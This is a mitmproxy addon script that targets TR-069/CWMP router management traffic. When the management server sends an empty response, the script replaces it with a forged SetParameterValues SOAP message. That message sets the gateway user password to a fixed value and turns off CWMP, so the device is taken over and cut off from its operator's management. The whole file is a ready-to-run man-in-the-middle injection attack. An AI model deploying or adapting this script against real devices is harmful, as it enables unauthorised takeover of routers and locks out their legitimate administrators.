from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    content_length = flow.response.headers.get("Content-Length")
    if content_length == "0" or flow.response.status_code == 204: 
        soap_response = """
<soapenv:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:cwmp="urn:dslforum-org:cwmp-1-0" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<soapenv:Header>
<cwmp:ID soapenv:mustUnderstand="1">2</cwmp:ID>
</soapenv:Header>
<soapenv:Body>
<cwmp:SetParameterValues>
<ParameterList soap:arrayType="cwmp:ParameterValueStruct[2]">
<ParameterValueStruct>
<Name>InternetGatewayDevice.User.1.Password</Name>
<Value xsi:type="xsd:string">Solroot2024.</Value>
</ParameterValueStruct>
<ParameterValueStruct>
<Name>InternetGatewayDevice.ManagementServer.EnableCWMP</Name>
<Value xsi:type="xsd:boolean">0</Value>
</ParameterValueStruct>
</ParameterList>
<ParameterKey>3</ParameterKey>
</cwmp:SetParameterValues>
</soapenv:Body>
</soapenv:Envelope>
        """
        
        flow.response.status_code = 200
        flow.response.headers["Content-Length"] = str(len(soap_response.strip()))
        flow.response.text = soap_response.strip()
addons = [
    response
]
